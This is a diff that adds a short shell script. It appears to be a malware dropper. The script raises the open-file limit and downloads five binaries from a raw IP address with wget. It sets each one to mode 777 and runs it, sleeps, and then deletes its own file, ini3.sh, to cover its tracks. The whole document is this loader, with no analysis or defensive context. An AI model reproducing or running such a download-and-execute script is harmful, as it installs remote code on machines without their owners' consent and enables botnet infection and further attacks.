@@ -1,0 +1,11 @@
+#!/bin/sh 
+
+ulimit -n 712
+wget http://31.14.136.217/nruhd; chmod 777 nruhd; ./nruhd
+wget http://31.14.136.217/nvhru; chmod 777 nvhru; ./nvhru
+wget http://31.14.136.217/wvmru; chmod 777 wvmru; ./wvmru
+wget http://31.14.136.217/mwovme; chmod 777 mwovme; ./mwovme
+wget http://31.14.136.217/meivne; chmod 777 meivne; ./meivne
+sleep 3;
+ 
+rm -rf ini3.sh
